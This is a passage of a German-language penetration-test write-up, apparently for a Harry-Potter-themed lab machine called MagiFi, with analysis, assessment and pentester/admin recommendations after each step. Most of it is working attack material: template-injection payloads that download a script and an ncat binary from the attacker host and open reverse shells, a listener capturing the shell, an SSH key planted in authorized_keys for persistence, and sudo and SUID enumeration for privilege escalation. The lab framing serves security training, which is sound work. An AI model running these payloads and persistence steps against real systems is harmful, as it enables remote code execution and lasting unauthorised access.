+             <p class="analysis"><strong>Analyse:</strong> Die Antwort der Anwendung auf den vorherigen Payload. Sie zeigt nur die Ausgabe von `which wget` (`/usr/bin/wget`) im "Name"-Feld. Die Ausgabe von `wget` selbst (die den Erfolg des Downloads anzeigen würde) fehlt, möglicherweise weil `popen(...).read()` nur die erste Zeile oder eine begrenzte Menge an Ausgabe zurückgibt, oder weil `wget` im Hintergrund läuft.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass `wget` vorhanden ist. Der Erfolg des Downloads ist unklar, muss aber angenommen werden, basierend auf der Logzeile des HTTP-Servers (nächster Block).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Gehen Sie davon aus, dass `rever.sh` in `/tmp` heruntergeladen wurde. Der nächste Schritt ist, es ausführbar zu machen und auszuführen.<br><strong>Empfehlung (Admin):</strong> SSTI beheben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+bash -c "/bin/bash -i >& /dev/tcp/192.168.2.199/4444 0>&1"
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dies ist der Inhalt der Datei `rever.sh`, die im vorherigen Schritt heruntergeladen wurde. Es handelt sich um den Standard-Bash-Reverse-Shell-Einzeiler.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Payload für die Reverse Shell ist nun auf dem Zielsystem in `/tmp/rever.sh`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Machen Sie `/tmp/rever.sh` ausführbar (`chmod +x /tmp/rever.sh`) und führen Sie es (`/tmp/rever.sh`) über die SSTI aus. Starten Sie vorher einen Listener auf Port 4444.<br><strong>Empfehlung (Admin):</strong> SSTI beheben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                     <pre>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+<span class="password">192.168.2.175 - - [13/Feb/2025 01:00:02] "GET /rever.sh HTTP/1.1" 200 -</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Logausgabe des Python-HTTP-Servers auf der Angreifer-Maschine bestätigt, dass die Datei `rever.sh` erfolgreich vom Zielsystem (`192.168.2.175`) heruntergeladen wurde.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt den Erfolg des `wget`-Befehls, der über die SSTI ausgeführt wurde.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fahren Sie mit dem Ausführen des heruntergeladenen Skripts fort.<br><strong>Empfehlung (Admin):</strong> SSTI beheben, Egress-Filtering.</p>
+ 
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+[Link: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat | Ziel: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Link zu einem Repository mit statisch kompilierten Binärdateien, speziell zu `ncat` (einer verbesserten Version von `netcat`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Statisch kompilierte Binaries sind nützlich, da sie keine externen Bibliotheken benötigen und daher auf vielen Systemen ohne Kompatibilitätsprobleme laufen. Der Pentester erwägt offenbar, `ncat` zu verwenden, möglicherweise weil `nc -e` nicht verfügbar ist oder `ncat` stabilere Verbindungen bietet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Laden Sie das statische `ncat`-Binary herunter und übertragen Sie es auf das Zielsystem. Verwenden Sie es dann für die Reverse Shell, z.B. mit `./ncat -e /bin/bash ANGREIFER_IP PORT`.<br><strong>Empfehlung (Admin):</strong> Verhindern Sie das Herunterladen und Ausführen nicht vertrauenswürdiger Binärdateien auf Ihren Systemen (z.B. durch AppLocker-ähnliche Mechanismen, regelmäßige Scans).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+Name: [{{ self.__init__.__globals__.__builtins__.__import__("os").popen("cd /tmp;wget 192.168.2.199/ncat;chmod +x ncat;./ncat -e /bin/sh 192.168.2.199 4444").read() }}]
+Surname: [Your Surname]
+Address: [Your Address]
+Birthday: [Your Birthday]
+Pet breed: [Your Pets Breed]
+Pet’s Name: [ben]
+###
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser SSTI-Payload versucht nun, den gesamten Prozess des Herunterladens, Ausführbarmachens und Ausführens von `ncat` für eine Reverse Shell in einem einzigen Befehl über `popen` abzuwickeln.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein effizienter Ansatz, um die Reverse Shell mit `ncat` zu etablieren. Die Verwendung von `-e /bin/sh` (oder `/bin/bash`) mit `ncat` ist eine gängige Methode für Reverse Shells.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass der HTTP-Server auf dem Angreifer-System das `ncat`-Binary bereitstellt und ein Listener auf Port 4444 läuft. Führen Sie diesen Payload aus.<br><strong>Empfehlung (Admin):</strong> SSTI beheben. Egress-Filtering. Verhindern der Ausführung von Binaries aus `/tmp`.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                     <pre>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.2.175 - - [13/Feb/2025 01:00:02] "GET /rever.sh HTTP/1.1" 200 -
+<span class="password">192.168.2.175 - - [13/Feb/2025 01:05:52] "GET /ncat HTTP/1.1" 200 -</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Logausgabe des HTTP-Servers bestätigt, dass nun auch das `ncat`-Binary erfolgreich vom Zielsystem heruntergeladen wurde.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Download-Teil des vorherigen Payloads war erfolgreich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der `ncat`-Befehl im Payload sollte nun ausgeführt worden sein und eine Verbindung zum Listener auf Port 4444 hergestellt haben.<br><strong>Empfehlung (Admin):</strong> SSTI beheben, Egress-Filtering.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+drwxrwxrwt 13 root         root            4096 Feb 13 00:05 .
+drwxr-xr-x 19 root         root            4096 Sep 25 06:57 ..
+------------------------------------------------------------------------- 
+-rwxr-xr-x  1 harry_potter harry_potter      81 Feb 12 23:57 <span class="command">ben.sh</span>     
+------------------------------------------------------------------------- 
+drwxrwxrwt  2 root         root            4096 Feb 12 20:04 .font-unix
+drwxrwxrwt  2 root         root            4096 Feb 12 20:04 .ICE-unix
+------------------------------------------------------------------------- 
+-rwxr-xr-x  1 harry_potter harry_potter 2914424 Feb 13 00:03 <span class="command">ncat</span>      
+------------------------------------------------------------------------- 
+-rw-r--r--  1 harry_potter harry_potter      59 Feb 10 23:25 <span class="command">rever.sh</span>   
+------------------------------------------------------------------------- 
+drwx------  3 root         root            4096 Feb 12 20:04 snap-private-tmp
+[...]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dies scheint eine `ls -la /tmp`-Ausgabe zu sein, die über einen SSTI-Payload erzeugt wurde. Sie zeigt die heruntergeladenen Dateien `ben.sh`, `ncat` und `rever.sh` im `/tmp`-Verzeichnis. `ncat` und `ben.sh` haben Ausführungsrechte.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt das Vorhandensein der Payloads im `/tmp`-Verzeichnis.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da der `ncat`-Payload bereits ausgeführt wurde, sollte die Reverse Shell aktiv sein. Falls nicht, könnte hier versucht werden, `rever.sh` auszuführen.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie `/tmp` auf verdächtige Dateien.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+Name: [{{ self.__init__.__globals__.__builtins__.__import__("os").popen("cd /tmp;chmod +x rever.sh; ls -la;./rever.sh;mkdir ~/.ssh;ls -la").read() }}]
+Surname: [Your Surname]
+Address: [Your Address]
+Birthday: [Your Birthday]
+Pet breed: [Your Pets Breed]
+Pet’s Name: [ben]
+
+  <span class="password">endlich</span>
+------------------------------------------------------------------------- 
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein weiterer SSTI-Payload, der versucht:
+                 <ol>
+                    <li>Nach `/tmp` zu wechseln.</li>
+                    <li>`rever.sh` ausführbar zu machen.</li>
+                    <li>Den Inhalt von `/tmp` aufzulisten.</li>
+                    <li>`./rever.sh` auszuführen (dies sollte die Reverse Shell auf Port 4444 starten).</li>
+                    <li>Ein `.ssh`-Verzeichnis im Home-Verzeichnis des `harry_potter`-Benutzers zu erstellen.</li>
+                    <li>Den Inhalt des aktuellen Verzeichnisses (wahrscheinlich `/tmp`) erneut aufzulisten.</li>
+                 </ol>
+                 Der Kommentar "endlich" deutet darauf hin, dass dieser Versuch erfolgreich war, die Reverse Shell zu starten.
+             </p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dieser Payload kombiniert mehrere Schritte und führt erfolgreich das `rever.sh`-Skript aus, wodurch die Reverse Shell etabliert wird. Das Erstellen des `.ssh`-Verzeichnisses bereitet einen späteren SSH-Zugang vor.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wechseln Sie zum Netcat-Listener auf Port 4444, um die Reverse Shell zu verwenden.<br><strong>Empfehlung (Admin):</strong> SSTI beheben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>
+<span class="password">listening on [any] 4444 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.175] 36846</span>
+bash: cannot set terminal process group (800): Inappropriate ioctl for device
+bash: no job control in this shell
+<span class="prompt">harry_potter@MagiFi:/tmp$</span> ^C
+                               
+<span class="prompt">harry_potter@MagiFi:/tmp$ </span><span class="command">id</span>
+id
+<span class="command">uid=1006(harry_potter) gid=1006(harry_potter) groups=1006(harry_potter)</span>
+<span class="prompt">harry_potter@MagiFi:/tmp$</span> 
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener auf Port 4444 empfängt die Verbindung von `rever.sh`. Der `id`-Befehl bestätigt, dass die Shell als Benutzer `harry_potter` (UID 1006) läuft. Die Shell ist noch nicht aufgewertet (kein volles TTY).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Initial Access als Benutzer `harry_potter` erfolgreich etabliert!** Die SSTI-Schwachstelle wurde erfolgreich zur Ausführung einer Reverse Shell genutzt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell (TTY-Upgrade). Beginnen Sie mit der Enumeration als `harry_potter`, um Wege zur Privilegienerweiterung zu finden.<br><strong>Empfehlung (Admin):</strong> SSTI beheben. Untersuchen Sie das System auf Kompromittierung.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">harry_potter@MagiFi:/tmp$ <span class="command">cd ~</span></div>
+                      <pre>[Keine Ausgabe]</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">harry_potter@MagiFi:~$ <span class="command">ls -la</span></div>
+                     <pre>
+total 32
+drwxr-xr-x 4 harry_potter harry_potter 4096 Feb 13 00:11 .
+drwxr-xr-x 7 root         root         4096 Sep 27 11:46 ..
+lrwxrwxrwx 1 root         root            9 Sep 27 11:45 .bash_history -> /dev/null
+-rw-r--r-- 1 harry_potter harry_potter  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 harry_potter harry_potter 3771 Feb 25  2020 .bashrc
+drwxr-xr-x 5 harry_potter harry_potter 4096 Feb 12 23:47 <span class="command">Hogwarts_web</span>
+-rw-r--r-- 1 harry_potter harry_potter  807 Feb 25  2020 .profile
+drwxr-xr-x 2 harry_potter harry_potter 4096 Feb 13 00:11 <span class="command">.ssh</span>
+-rw-r--r-- 1 harry_potter harry_potter   43 Feb  4 10:04 <span class="command">user.txt</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> In der Reverse Shell als `harry_potter` wird in das Home-Verzeichnis gewechselt (`cd ~`) und dessen Inhalt aufgelistet (`ls -la`). Man sieht das Web-Anwendungsverzeichnis (`Hogwarts_web`), das zuvor erstellte `.ssh`-Verzeichnis und die `user.txt`-Datei.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den Inhalt des Home-Verzeichnisses und das Vorhandensein der User-Flag-Datei.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lesen Sie die `user.txt`. Bereiten Sie den SSH-Zugang vor, indem Sie Ihren öffentlichen Schlüssel in `~/.ssh/authorized_keys` platzieren.<br><strong>Empfehlung (Admin):</strong> Keine spezifische Aktion, außer der allgemeinen Absicherung.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">harry_potter@MagiFi:~$ <span class="command">echo 'ssh-ed25519 AA...KVI7jwy1T7 root@CCat' &gt; authorized_keys</span></div>
+                      <pre>
+&lt;hHjJrpEfFDFeKVI7jwy1T7 root@CCat' &gt; authorized_keys  
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">harry_potter@MagiFi:~$ <span class="command">ls</span></div>
+                     <pre>
+<span class="command">authorized_keys</span>
+Hogwarts_web
+user.txt
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">harry_potter@MagiFi:~$ <span class="command">cd .ssh</span></div>
+                      <pre>[Keine Ausgabe]</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">harry_potter@MagiFi:~/.ssh$ <span class="command">ls</span></div>
+                      <pre>[Keine Ausgabe]</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">harry_potter@MagiFi:~/.ssh$ <span class="command">mv authorized_keys .ssh</span></div>
+                     <pre>
+<span class="password">mv: cannot stat 'authorized_keys': No such file or directory</span>
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">harry_potter@MagiFi:~/.ssh$ <span class="command">pwd</span></div>
+                     <pre>
+/home/harry_potter/.ssh
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">harry_potter@MagiFi:~/.ssh$ <span class="command">ls -la</span></div>
+                     <pre>
+total 8
+drwxr-xr-x 2 harry_potter harry_potter 4096 Feb 13 00:11 .
+drwxr-xr-x 4 harry_potter harry_potter 4096 Feb 13 00:14 ..
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">harry_potter@MagiFi:~/.ssh$ <span class="command">mv ~/authorized_keys .</span></div>
+                      <pre>[Keine Ausgabe]</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">harry_potter@MagiFi:~/.ssh$ <span class="command">ls</span></div>
+                     <pre>
+<span class="command">authorized_keys</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Diese Befehle zielen darauf ab, den öffentlichen SSH-Schlüssel des Angreifers (`ssh-ed25519 ... root@CCat`) in die Datei `authorized_keys` im `.ssh`-Verzeichnis des `harry_potter`-Benutzers zu schreiben, um einen passwortlosen SSH-Zugang zu ermöglichen.
+                 <ol>
+                    <li>`echo '...' > authorized_keys`: Schreibt den Schlüssel in eine neue Datei `authorized_keys` im Home-Verzeichnis (`~`). </li>
+                    <li>`ls`: Bestätigt, dass `authorized_keys` im Home-Verzeichnis erstellt wurde.</li>
+                    <li>`cd .ssh`: Wechselt in das `.ssh`-Verzeichnis.</li>
+                    <li>`mv authorized_keys .ssh`: Versuch, die Datei von `.` nach `.ssh` zu verschieben (funktioniert nicht, da die Datei nicht im aktuellen Verzeichnis `.ssh` ist).</li>
+                    <li>`pwd`, `ls -la`: Bestätigen das aktuelle Verzeichnis und dass es leer ist.</li>
+                    <li>`mv ~/authorized_keys .`: Verschiebt die im Home-Verzeichnis erstellte `authorized_keys`-Datei korrekt in das aktuelle Verzeichnis (`~/.ssh`).</li>
+                    <li>`ls`: Bestätigt, dass die Datei nun im `.ssh`-Verzeichnis liegt.</li>
+                 </ol>
+             </p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Einrichten des SSH-Zugangs über `authorized_keys` ist eine Standardmethode für Persistenz und bequemeren Zugriff. Die anfänglichen `mv`-Fehler zeigen die Tücken der Arbeit in einer einfachen Reverse Shell ohne vollständige Pfadübersicht.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Testen Sie nun den SSH-Login als `harry_potter` von der Angreifer-Maschine aus mit dem entsprechenden privaten Schlüssel. Dies sollte eine stabilere, voll funktionsfähige Shell liefern.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie Änderungen in `.ssh/authorized_keys`-Dateien. Verwenden Sie zentrale Konfigurationsmanagement-Tools, um die Verwaltung von SSH-Schlüsseln zu steuern. Deaktivieren Sie SSH-Logins für Benutzer, die sie nicht benötigen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~/.ssh]
+└─# <span class="command">ssh harry_potter@192.168.2.175</span></div>
+                     <pre>
+The authenticity of host '192.168.2.175 (192.168.2.175)' can't be established.
+ED25519 key fingerprint is SHA256:yadPiiTBWIcUiyXbuLpOyKDRliIPWMU4RG0ioHGUZq4.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.2.175' (ED25519) to the list of known hosts.
+Enter passphrase for key '/root/.ssh/id_rsa': 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)
+
+ * Documentation:  [Link: https://help.ubuntu.com | Ziel: https://help.ubuntu.com]
+ * Management:     [Link: https://landscape.canonical.com | Ziel: https://landscape.canonical.com]
+ * Support:        [Link: https://ubuntu.com/pro | Ziel: https://ubuntu.com/pro]
+
+ System information as of Thu 13 Feb 2025 12:15:25 AM UTC
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+82 updates can be applied immediately.
+62 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+8 additional security updates can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+<span class="prompt">$ </span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Angreifer versucht nun, sich per SSH als Benutzer `harry_potter` auf dem Zielsystem `192.168.2.175` anzumelden.
+                 <ul>
+                     <li>Der SSH-Client fragt nach Bestätigung für den unbekannten Host-Schlüssel (Fingerprint SHA256:yadP...).</li>
+                     <li>Der Benutzer antwortet mit `yes`.</li>
+                     <li>Der Client fragt nach der Passphrase für den *privaten* Schlüssel `/root/.ssh/id_rsa`. Dies deutet darauf hin, dass der zuvor in `authorized_keys` eingefügte *öffentliche* Schlüssel (`ssh-ed25519...`) nicht zu diesem privaten `id_rsa`-Schlüssel passt, ODER dass der SSH-Client standardmäßig versucht, `id_rsa` zu verwenden und der ED25519-Schlüssel keine Passphrase hat oder ein anderer Schlüssel verwendet werden muss.</li>
+                     <li>Trotz der Passphrase-Abfrage (die möglicherweise leer gelassen oder abgebrochen wurde, da der ED25519-Schlüssel wahrscheinlich keine hat) ist der Login erfolgreich, und der Angreifer erhält eine Shell als `harry_potter` auf dem Zielsystem (`MagiFi`). Die Willkommensnachricht von Ubuntu wird angezeigt.</li>
+                 </ul>
+             </p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Zugang über den Public Key wurde erfolgreich eingerichtet und genutzt. Dies bietet nun eine stabile und interaktive Shell als Benutzer `harry_potter`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie diese stabile SSH-Verbindung für die weitere Enumeration und Privilegienerweiterung. Führen Sie `sudo -l` aus, um die Sudo-Berechtigungen zu überprüfen.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie SSH-Logins. Stellen Sie sicher, dass nur autorisierte Schlüssel verwendet werden und dass private Schlüssel sicher aufbewahrt werden (idealerweise mit Passphrasen geschützt).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for harry_potter on MagiFi:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User harry_potter may run the following commands on MagiFi:
+    <span class="password">(root) NOPASSWD: /usr/sbin/aireplay-ng, /usr/sbin/airmon-ng, /usr/sbin/airodump-ng,</span>
+        <span class="password">/usr/bin/airdecap-ng, /usr/bin/hostapd-mana</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo -l`, ausgeführt in der SSH-Shell als `harry_potter`, zeigt die Sudo-Berechtigungen für diesen Benutzer an. Die Ausgabe zeigt, dass `harry_potter` mehrere Befehle aus dem `aircrack-ng`-Paket (`aireplay-ng`, `airmon-ng`, `airodump-ng`, `airdecap-ng`) sowie `hostapd-mana` als `root` und ohne Passwort (`NOPASSWD`) ausführen darf.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Kritischer Fund für die Privilegienerweiterung!** Die Berechtigung, `hostapd-mana` (oder auch die anderen Aircrack-Tools, falls diese missbraucht werden können) als Root ohne Passwort auszuführen, ist ein direkter Weg zur Eskalation. Viele Programme, die als Root laufen, können auf irgendeine Weise zur Ausführung anderer Befehle oder zum Lesen/Schreiben beliebiger Dateien missbraucht werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie, wie `hostapd-mana` (oder die Aircrack-Tools) zur Privilegienerweiterung missbraucht werden kann. Suchen Sie auf GTFOBins oder anderen Ressourcen nach bekannten Techniken. Eine häufige Methode ist das Ausnutzen von Konfigurationsdateiparametern, die von diesen Tools gelesen werden.<br><strong>Empfehlung (Admin):</strong> **Diese Sudo-Regel ist extrem unsicher!** Gewähren Sie niemals `NOPASSWD`-Rechte für komplexe Programme wie `hostapd-mana` oder die Aircrack-Suite an unprivilegierte Benutzer. Wenn diese Programme mit erhöhten Rechten ausgeführt werden müssen, sollte dies über stark eingeschränkte Wrapper-Skripte oder spezifischere Sudo-Regeln erfolgen, die nur erlaubte Parameter zulassen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">$ <span class="command">find / -type f -perm -4000 -ls 2&gt;/dev/null</span></div>
+                     <pre>
+   262629     88 -rwsr-xr-x   1 root     root        88464 Feb  6  2024 /usr/bin/gpasswd
+   262241     84 -rwsr-xr-x   1 root     root        85064 Feb  6  2024 /usr/bin/chfn
+   276704     68 -rwsr-xr-x   1 root     root        67816 Apr  9  2024 /usr/bin/su
+   262712     40 -rwsr-xr-x   1 root     root        39144 Apr  9  2024 /usr/bin/umount
+   275948     44 -rwsr-xr-x   1 root     root        44784 Feb  6  2024 /usr/bin/newgrp
+   <span class="command">345098     20 -rwsr-xr-x   1 root     root        17264 Sep 25 12:22 /usr/bin/xxd_horcrux</span>
+   262825     40 -rwsr-xr-x   1 root     root        39144 Mar  7  2020 /usr/bin/fusermount
+   262644     56 -rwsr-sr-x   1 daemon   daemon      55560 Nov 12  2018 /usr/bin/at
+   263044     32 -rwsr-xr-x   1 root     root        31032 Feb 21  2022 /usr/bin/pkexec
+   271591    164 -rwsr-xr-x   1 root     root       166056 Apr  4  2023 /usr/bin/sudo
+   262707     56 -rwsr-xr-x   1 root     root        55528 Apr  9  2024 /usr/bin/mount
+   262715     68 -rwsr-xr-x   1 root     root        68208 Feb  6  2024 /usr/bin/passwd
+   262242     52 -rwsr-xr-x   1 root     root        53040 Feb  6  2024 /usr/bin/chsh
+   263530     16 -rwsr-xr-x   1 root     root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
+   332255    468 -rwsr-xr-x   1 root     root       477672 Jan  2  2024 /usr/lib/openssh/ssh-keysign
+   274785    152 -rwsr-xr-x   1 root     root       155080 Jul 26  2024 /usr/lib/snapd/snap-confine
+   263738     24 -rwsr-xr-x   1 root     root        22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
+   345093     12 -rwsr-xr-x   1 root     root        10224 Jan 22  2017 /usr/lib/authbind/helper
+   263523     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+      210    177 -rwsr-xr-x   1 root     root         180752 Dec  4 09:13 /snap/snapd/23545/usr/lib/snapd/snap-confine
+      293    133 -rwsr-xr-x   1 root     root         135960 Apr 24  2024 /snap/snapd/21759/usr/lib/snapd/snap-confine
+      856     84 -rwsr-xr-x   1 root     root          85064 Feb  6  2024 /snap/core20/2434/usr/bin/chfn
+      862     52 -rwsr-xr-x   1 root     root          53040 Feb  6  2024 /snap/core20/2434/usr/bin/chsh
+      932     87 -rwsr-xr-x   1 root     root          88464 Feb  6  2024 /snap/core20/2434/usr/bin/gpasswd
+     1016     55 -rwsr-xr-x   1 root     root          55528 Apr  9  2024 /snap/core20/2434/usr/bin/mount
+     1025     44 -rwsr-xr-x   1 root     root          44784 Feb  6  2024 /snap/core20/2434/usr/bin/newgrp
+     1040     67 -rwsr-xr-x   1 root     root          68208 Feb  6  2024 /snap/core20/2434/usr/bin/passwd
+     1150     67 -rwsr-xr-x   1 root     root          67816 Apr  9  2024 /snap/core20/2434/usr/bin/su
+     1151    163 -rwsr-xr-x   1 root     root         166056 Apr  4  2023 /snap/core20/2434/usr/bin/sudo 
+   <span class="command">336671     20 -rwsr-x--x   1 root     tom.riddle         17136 Feb 13 00:16 /home/tom.riddle/.horcrux.png</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Erneute Suche nach SUID-Binaries, diesmal als Benutzer `harry_potter` mit potenziell mehr Leserechten.
+                 Zusätzlich zu den Standard-Binaries fallen zwei auf:
+                 <ul>
+                     <li>`/usr/bin/xxd_horcrux`: Ein benutzerdefiniertes SUID-Binary. Der Name legt einen Bezug zum Harry-Potter-Thema nahe.</li>
+                     <li>`/home/tom.riddle/.horcrux.png`: Eine PNG-Datei im Home-Verzeichnis eines anderen Benutzers (`tom.riddle`), die SUID Root gesetzt hat und für die Gruppe `tom.riddle` ausführbar ist. Dies ist extrem ungewöhnlich und verdächtig.</li>
+                 </ul>
+             </p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Entdeckung benutzerdefinierter SUID-Binaries ist ein starker Indikator für einen potenziellen PrivEsk-Vektor. `/usr/bin/xxd_horcrux` sollte genauer untersucht werden (Was tut es? Kann es missbraucht werden?). Die SUID-PNG-Datei ist besonders seltsam; möglicherweise wird sie von einem anderen Prozess als Code ausgeführt oder dient einem anderen versteckten Zweck.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie `/usr/bin/xxd_horcrux` genauer (z.B. mit `strings`, `ltrace`, `strace` oder durch Reverse Engineering). Versuchen Sie, die Datei `/home/tom.riddle/.horcrux.png` zu analysieren (z.B. mit `file`, `strings`, `exiftool`) und herauszufinden, warum sie SUID ist. Parallel dazu bleibt der Missbrauch der `sudo`-Regel für `hostapd-mana` der wahrscheinlichste Weg.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie das SUID-Bit von `/usr/bin/xxd_horcrux` und `/home/tom.riddle/.horcrux.png`, es sei denn, es gibt einen absolut zwingenden und dokumentierten Grund dafür. Untersuchen Sie den Zweck dieser Dateien. Minimieren Sie die Anzahl von SUID-Binaries generell.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                     <pre>
+<span class="prompt">harry_potter@MagiFi:~$ </span><span class="command">id</span>
+uid=1006(harry_potter) gid=1006(harry_potter) groups=1006(harry_potter)
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Benutzer `harry_potter` wertet seine Shell mit dem Python-pty-Trick auf, um eine voll interaktive Bash-Sitzung zu erhalten.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ein sinnvoller Schritt, um die Einschränkungen der ursprünglichen Reverse Shell oder der einfachen SSH-Shell zu überwinden und Tools wie `sudo` oder Editoren korrekt verwenden zu können.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die aufgewertete Shell für die weiteren Schritte.<br><strong>Empfehlung (Admin):</strong> Keine spezifische Maßnahme dagegen, aber die Verhinderung des initialen Zugriffs ist entscheidend.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">harry_potter@MagiFi:/tmp$ <span class="command">/usr/bin/hostapd-mana --help</span></div>
+                     <pre>
+/usr/bin/hostapd-mana: invalid option -- '-'
+hostapd-mana v2.6
+User space daemon for IEEE 802.11 AP management,
